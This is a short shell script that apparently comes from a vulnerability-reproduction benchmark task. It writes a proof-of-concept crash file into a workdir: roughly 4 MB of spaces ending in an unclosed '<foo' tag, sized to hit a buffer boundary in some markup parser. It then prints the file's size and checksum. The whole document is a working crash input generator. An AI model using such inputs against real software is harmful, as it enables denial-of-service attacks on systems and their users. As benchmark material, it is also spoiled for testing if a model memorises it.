set -eu
size=$((0x400000-25))
head -c $((size-4)) /dev/zero | tr '\0' ' ' > /CybinGym_workdir/poc_crash
printf '<foo' >> /CybinGym_workdir/poc_crash
stat -c 'size=%s' /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
